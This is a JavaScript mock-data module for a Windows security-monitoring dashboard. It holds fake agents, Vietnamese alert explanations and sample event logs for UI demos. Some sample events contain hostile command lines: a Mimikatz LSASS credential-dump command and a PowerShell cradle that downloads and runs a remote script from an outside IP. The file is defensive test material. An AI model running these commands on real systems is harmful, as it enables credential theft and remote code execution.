/**
 * WinLog SOC - Mock Data Module
 * Provides realistic enterprise SOC datasets for offline testing, UI verification,
 * and presentation demo mode without requiring a running live backend.
 */

window.WinLogMock = (function () {
  const MOCK_AGENTS = [
    {
      client_id: "192.168.153.147",
      hostname: "DESKTOP-D38O4BR",
      status: "active",
      live: true,
      events: 2840,
      alerts: 6,
      last_verdict: "ALERT",
      last_seen: new Date(Date.now() - 15 * 1000).toISOString()
    },
    {
      client_id: "192.168.153.1",
      hostname: "WIN-SERVER-2022-DC",
      status: "active",
      live: true,
      events: 4920,
      alerts: 2,
      last_verdict: "NORMAL",
      last_seen: new Date(Date.now() - 45 * 1000).toISOString()
    },
    {
      client_id: "192.168.153.150",
      hostname: "DEV-STATION-WIN10",
      status: "active",
      live: true,
      events: 1680,
      alerts: 0,
      last_verdict: "NORMAL",
      last_seen: new Date(Date.now() - 120 * 1000).toISOString()
    }
  ];

  const MOCK_ANALYSES = [
    {
      id: "INC-20261126-001",
      ts: new Date(Date.now() - 2 * 60 * 1000).toISOString(),
      agent: "192.168.153.147",
      host: "DESKTOP-D38O4BR",
      label: "ALERT",
      source: "rule+ai",
      elapsed: 8.42,
      model: "qwen2.5:3b",
      live: true,
      status: "OK",
      reason: "Bộ luật tương quan ghi nhận:\n- Phát hiện Mimikatz sekurlsa dump mật khẩu từ bộ nhớ LSASS (Event 4688)\n- Tạo tiến trình powershell.xml gọi API cấp quyền đặc biệt\nNhận định của AI: Hành vi trích xuất thông tin xác thực từ tiến trình hệ thống LSASS bằng công cụ Mimikatz, thuộc kỹ thuật T1003 OS Credential Dumping.",
      stages: ["Credential Access (MITRE T1003.001)", "Execution (MITRE T1059.001)"],
      evidence: ["4688", "4672", "4104"],
      true_label: "ALERT"
    },
    {
      id: "INC-20261126-002",
      ts: new Date(Date.now() - 12 * 60 * 1000).toISOString(),
      agent: "192.168.153.147",
      host: "DESKTOP-D38O4BR",
      label: "ALERT",
      source: "rule+ai",
      elapsed: 9.15,
      model: "qwen2.5:3b",
      live: true,
      status: "OK",
      reason: "Bộ luật tương quan ghi nhận:\n- PowerShell Encoded Command & Download Cradle tải payload từ máy chủ C2 từ xa\nNhận định của AI: Lệnh PowerShell mã hóa Base64 gọi IEX Net.WebClient để tải và thực thi tập lệnh độc hại từ IP bên ngoài, thuộc kỹ thuật T1059.001 và T1105.",
      stages: ["Execution (MITRE T1059.001)", "Command and Control (MITRE T1105)"],
      evidence: ["4104", "4688"],
      true_label: "ALERT"
    },
    {
      id: "INC-20261126-003",
      ts: new Date(Date.now() - 25 * 60 * 1000).toISOString(),
      agent: "192.168.153.147",
      host: "DESKTOP-D38O4BR",
      label: "ALERT",
      source: "rule+ai",
      elapsed: 7.28,
      model: "qwen2.5:3b",
      live: true,
      status: "OK",
      reason: "Bộ luật tương quan ghi nhận:\n- Tạo tài khoản cục bộ bất thường và thêm vào nhóm Administrators đặc quyền (Event 4720, 4732)\nNhận định của AI: Kẻ tấn công tạo tài khoản backdoor 'support_admin' nhằm duy trì quyền truy cập lâu dài trên hệ điều hành, thuộc kỹ thuật T1136 / T1098.",
      stages: ["Persistence (MITRE T1136.001)", "Privilege Escalation (MITRE T1098)"],
      evidence: ["4720", "4732", "4688"],
      true_label: "ALERT"
    },
    {
      id: "INC-20261126-004",
      ts: new Date(Date.now() - 40 * 60 * 1000).toISOString(),
      agent: "192.168.153.1",
      host: "WIN-SERVER-2022-DC",
      label: "ALERT",
      source: "rule+ai",
      elapsed: 6.85,
      model: "qwen2.5:3b",
      live: true,
      status: "OK",
      reason: "Bộ luật tương quan ghi nhận:\n- Phát hiện 42 lần đăng nhập thất bại liên tiếp (Event 4625) trong vòng 20 giây đối với tài khoản Administrator\nNhận định của AI: Tấn công dò mật khẩu tự động Password Brute Force qua giao thức RDP/SMB, thuộc kỹ thuật T1110.001.",
      stages: ["Credential Access (MITRE T1110.001)"],
      evidence: ["4625"],
      true_label: "ALERT"
    },
    {
      id: "INC-20261126-005",
      ts: new Date(Date.now() - 55 * 60 * 1000).toISOString(),
      agent: "192.168.153.147",
      host: "DESKTOP-D38O4BR",
      label: "NORMAL",
      source: "ai",
      elapsed: 5.40,
      model: "qwen2.5:3b",
      live: true,
      status: "OK",
      reason: "Nhận định của AI: Các sự kiện tạo tiến trình chrome.exe, code.exe và svchost.exe là hoạt động làm việc bình thường của lập trình viên, không ghi nhận hành vi độc hại.",
      stages: [],
      evidence: ["4688", "4624"],
      true_label: "NORMAL"
    }
  ];

  const MOCK_EVENTS = [
    {
      id: "EV-001",
      ts: new Date(Date.now() - 1 * 60 * 1000).toISOString(),
      recv: new Date(Date.now() - 1 * 60 * 1000).toISOString(),
      live: true,
      agent: "192.168.153.147",
      host: "DESKTOP-D38O4BR",
      channel: "Security",
      event_id: 4688,
      title: "New process created",
      rule: "Credential dumping tool (Mimikatz)",
      level: 13,
      user: "SYSTEM",
      ip: "127.0.0.1",
      summary: "mimikatz.exe <- powershell.exe  |  privilege::debug sekurlsa::logonpasswords exit",
      data: {
        NewProcessName: "C:\\Tools\\mimikatz.exe",
        ParentProcessName: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        CommandLine: "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
        SubjectUserName: "SYSTEM",
        ProcessId: "0x34a1"
      }
    },
    {
      id: "EV-002",
      ts: new Date(Date.now() - 2 * 60 * 1000).toISOString(),
      recv: new Date(Date.now() - 2 * 60 * 1000).toISOString(),
      live: true,
      agent: "192.168.153.147",
      host: "DESKTOP-D38O4BR",
      channel: "Microsoft-Windows-PowerShell/Operational",
      event_id: 4104,
      title: "PowerShell script block",
      rule: "PowerShell download/execute",
      level: 12,
      user: "Administrator",
      ip: "",
      summary: "IEX ((New-Object System.Net.WebClient).DownloadString('http://45.77.1.2/stage2.ps1'))",
      data: {
        ScriptBlockText: "IEX ((New-Object System.Net.WebClient).DownloadString('http://45.77.1.2/stage2.ps1'))",
        Path: "C:\\Users\\Admin\\AppData\\Local\\Temp\\run.ps1",
        UserId: "S-1-5-21-392182-500"
      }
    },
    {
      id: "EV-003",
      ts: new Date(Date.now() - 3 * 60 * 1000).toISOString(),
      recv: new Date(Date.now() - 3 * 60 * 1000).toISOString(),
      live: true,
      agent: "192.168.153.147",
      host: "DESKTOP-D38O4BR",
      channel: "Security",
      event_id: 4720,
      title: "User account created",
      rule: "User account created",
      level: 10,
      user: "Administrator",
      ip: "",
      summary: "support_admin created by Administrator",
      data: {
        TargetUserName: "support_admin",
        SubjectUserName: "Administrator",
        PrivilegeList: "SeSecurityPrivilege"
      }
    },
    {
      id: "EV-004",
      ts: new Date(Date.now() - 4 * 60 * 1000).toISOString(),
      recv: new Date(Date.now() - 4 * 60 * 1000).toISOString(),
      live: true,
      agent: "192.168.153.147",
      host: "DESKTOP-D38O4BR",
      channel: "Security",
      event_id: 4732,
      title: "Member added to local group",
      rule: "Local account / admin group tampering",
      level: 12,
      user: "Administrator",
      ip: "",
      summary: "support_admin added to Administrators by Administrator",
      data: {
        TargetUserName: "support_admin",
        MemberName: "Administrators",
        SubjectUserName: "Administrator"
      }
    },
    {
      id: "EV-005",
      ts: new Date(Date.now() - 5 * 60 * 1000).toISOString(),
      recv: new Date(Date.now() - 5 * 60 * 1000).toISOString(),
      live: true,
      agent: "192.168.153.1",
      host: "WIN-SERVER-2022-DC",
      channel: "Security",
      event_id: 4625,
      title: "Failed logon",
      rule: "Failed logon",
      level: 5,
      user: "Administrator",
      ip: "192.168.153.100",
      summary: "Administrator from 192.168.153.100  (logon type Network)  status 0xC000006D",
      data: {
        TargetUserName: "Administrator",
        IpAddress: "192.168.153.100",
        LogonType: "3",
        Status: "0xC000006D",
        SubStatus: "0xC000006A"
      }
    },
    {
      id: "EV-006",
      ts: new Date(Date.now() - 6 * 60 * 1000).toISOString(),
      recv: new Date(Date.now() - 6 * 60 * 1000).toISOString(),
      live: true,
      agent: "192.168.153.150",
      host: "DEV-STATION-WIN10",
      channel: "Security",
      event_id: 4624,
      title: "Successful logon",
      rule: "Successful logon",
      level: 3,
      user: "developer01",
      ip: "127.0.0.1",
      summary: "developer01 from 127.0.0.1  (logon type Interactive)",
      data: {
        TargetUserName: "developer01",
        IpAddress: "127.0.0.1",
        LogonType: "2"
      }
    },
    {
      id: "EV-007",
      ts: new Date(Date.now() - 7 * 60 * 1000).toISOString(),
      recv: new Date(Date.now() - 7 * 60 * 1000).toISOString(),
      live: true,
      agent: "192.168.153.150",
      host: "DEV-STATION-WIN10",
      channel: "Security",
      event_id: 4688,
      title: "New process created",
      rule: "New process created",
      level: 3,
      user: "developer01",
      ip: "",
      summary: "code.exe <- explorer.exe  |  C:\\Users\\Dev\\AppData\\Local\\Programs\\VSCode\\Code.exe",
      data: {
        NewProcessName: "C:\\Users\\Dev\\AppData\\Local\\Programs\\VSCode\\Code.exe",
        ParentProcessName: "C:\\Windows\\explorer.exe",
        CommandLine: "Code.exe H:\\Nam 4\\DACN",
        SubjectUserName: "developer01"
      }
    }
  ];

  const MOCK_TERMINAL = [
    { ts: new Date(Date.now() - 120 * 1000).toISOString(), stream: "stdout", line: "[+] WinLog AI Agent SOC Server started on https://127.0.0.1:8443" },
    { ts: new Date(Date.now() - 110 * 1000).toISOString(), stream: "stdout", line: "[+] Local SLM Engine loaded: Ollama qwen2.5:3b (keep_alive enabled)" },
    { ts: new Date(Date.now() - 90 * 1000).toISOString(), stream: "stdout", line: "[*] Inbound connection accepted from agent 192.168.153.147 (TLS 1.3)" },
    { ts: new Date(Date.now() - 60 * 1000).toISOString(), stream: "stdout", line: "[*] Batch received: 14 events (Security: 11, PowerShell: 3) from DESKTOP-D38O4BR" },
    { ts: new Date(Date.now() - 40 * 1000).toISOString(), stream: "stdout", line: "[!] Rule match: T1003.001 Mimikatz LSASS memory access pattern" },
    { ts: new Date(Date.now() - 25 * 1000).toISOString(), stream: "stdout", line: "[!] PHAT HIEN TAN CONG: AI confirmed ALERT on DESKTOP-D38O4BR (Elapsed: 8.42s)" },
    { ts: new Date(Date.now() - 10 * 1000).toISOString(), stream: "stdout", line: "[✓] Deduplication check passed (NEW_TECHNIQUE) -> Dispatched to Telegram bot & SIEM Web" }
  ];

  const TIMELINE_DATA = [
    { label: "00:00", normal: 180, attack: 0 },
    { label: "03:00", normal: 120, attack: 0 },
    { label: "06:00", normal: 240, attack: 2 },
    { label: "09:00", normal: 680, attack: 5 },
    { label: "12:00", normal: 920, attack: 14 },
    { label: "15:00", normal: 850, attack: 8 },
    { label: "18:00", normal: 640, attack: 4 },
    { label: "21:00", normal: 310, attack: 1 }
  ];

  const DISTRIBUTION_STATS = {
    totalEvents: 9829,
    categories: [
      { name: "Process Creation (4688)", count: 2487, change: "+1.8%", level: "med" },
      { name: "PowerShell ScriptBlock (4104)", count: 1828, change: "+2.3%", level: "high" },
      { name: "Logon / Auth (4624/4625)", count: 1463, change: "-1.04%", level: "crit" },
      { name: "Privilege Tampering (4732)", count: 642, change: "+0.5%", level: "crit" }
    ]
  };

  return {
    getState: function () {
      return {
        server_time: new Date().toISOString(),
        uptime: 14820,
        seq: 142,
        totals: {
          events: 9829,
          alerts: 14,
          analyses: 37
        },
        events: MOCK_EVENTS,
        analyses: MOCK_ANALYSES,
        agents: MOCK_AGENTS,
        terminal: MOCK_TERMINAL,
        timeline: TIMELINE_DATA,
        distribution: DISTRIBUTION_STATS
      };
    }
  };
})();
